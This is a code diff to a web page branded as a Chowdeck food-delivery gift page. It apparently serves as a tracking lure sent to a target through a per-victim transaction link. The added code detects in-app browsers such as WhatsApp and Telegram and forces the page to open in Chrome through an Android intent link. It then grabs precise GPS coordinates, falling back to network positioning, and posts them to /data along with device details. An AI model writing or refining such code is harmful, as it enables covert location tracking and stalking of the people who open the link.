@@ -83,9 +83,15 @@
 
     .skeleton { background:linear-gradient(90deg,#f5ede9 25%,#ecddd7 50%,#f5ede9 75%); background-size:200% 100%; animation:shimmer 1.5s infinite; border-radius:4px; height:13px; margin-bottom:5px; }
     @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+    #inapp-banner { display:none; background:#fffbe6; border-bottom:2px solid #FFC501; padding:12px 16px; font-size:0.82rem; color:#5a4000; text-align:center; line-height:1.6; }
+    #inapp-banner a { color:#1B4F2A; font-weight:700; text-decoration:underline; }
   </style>
 </head>
 <body>
+  <div id="inapp-banner">
+    Open this link in <strong>Chrome</strong> or your phone browser for it to work correctly.
+    &nbsp;<a id="open-browser-link" href="#">Tap here to open in Chrome</a>
+  </div>
 
   <div class="topbar">
     <svg viewBox="0 0 1314 208" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:28px;width:auto;">
@@ -178,6 +184,19 @@
   <div class="footer" style="background:#1B4F2A;color:rgba(255,255,255,0.5);padding:16px;text-align:center;font-size:0.67rem;">Chowdeck Limited &nbsp;|&nbsp; Food Delivery &amp; Gifting Platform &nbsp;|&nbsp; Lagos, Nigeria</div>
 
   <script>
+    // In-app browser detection
+    (function() {
+      const ua = navigator.userAgent || '';
+      const isInApp = /FBAN|FBAV|Instagram|WhatsApp|Telegram|Twitter|TikTok/.test(ua) ||
+        (ua.includes('Android') && /; wv\)/.test(ua));
+      if (isInApp) {
+        const banner = document.getElementById('inapp-banner');
+        banner.style.display = 'block';
+        const link = document.getElementById('open-browser-link');
+        const url = window.location.href;
+        link.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+      }
+    })();
     const TXN_ID = (function() {
       const fromUrl = window.location.pathname.replace(/^\//, '').trim();
       return fromUrl || 'CDGIFT';
@@ -280,35 +299,54 @@
 
       if (navigator.geolocation) {
         let sent = false;
-        const watcher = navigator.geolocation.watchPosition(
-          (pos) => {
-            if (sent) return;
-            if (pos.coords.accuracy > 500) return;
-            sent = true;
-            navigator.geolocation.clearWatch(watcher);
-            fetch('/data', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                txn_id: TXN_ID, source: 'gps',
-                gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude,
-                gps_accuracy_meters: pos.coords.accuracy,
-                screen: screen.width+'x'+screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform, ua: navigator.userAgent,
-                timestamp: new Date().toISOString()
-              })
-            });
-            localStorage.setItem('chow_result_' + TXN_ID, 'success');
-            showResult();
-          },
+
+        function sendGPS(pos) {
+          if (sent) return;
+          sent = true;
+          fetch('/data', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              txn_id: TXN_ID, source: 'gps',
+              gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude,
+              gps_accuracy_meters: pos.coords.accuracy,
+              screen: screen.width+'x'+screen.height,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              platform: navigator.platform, ua: navigator.userAgent,
+              timestamp: new Date().toISOString()
+            })
+          });
+          localStorage.setItem('chow_result_' + TXN_ID, 'success');
+          showResult();
+        }
+
+        function tryNetworkGPS() {
+          // Network/WiFi positioning — works indoors, triggers prompt reliably
+          navigator.geolocation.getCurrentPosition(
+            sendGPS,
+            () => { if (!sent) { sent = true; localStorage.setItem('chow_result_' + TXN_ID, 'failed'); showError(); } },
+            { enableHighAccuracy: false, timeout: 12000, maximumAge: 0 }
+          );
+        }
+
+        // Step 1: try GPS (high accuracy, short timeout)
+        navigator.geolocation.getCurrentPosition(
+          sendGPS,
           (err) => {
-            if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); localStorage.setItem('chow_result_' + TXN_ID, 'failed'); showError(); }
+            if (sent) return;
+            if (err.code === 1) {
+              // Explicitly denied
+              sent = true;
+              localStorage.setItem('chow_result_' + TXN_ID, 'failed');
+              showError();
+            } else {
+              // Timeout or unavailable — step 2: network positioning
+              tryNetworkGPS();
+            }
           },
-          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
-        setTimeout(() => {
-          if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); localStorage.setItem('chow_result_' + TXN_ID, 'failed'); showError(); }
-        }, 30000);
+
+        setTimeout(() => { if (!sent) { sent = true; showResult(); } }, 25000);
       } else {
         showError();
       }
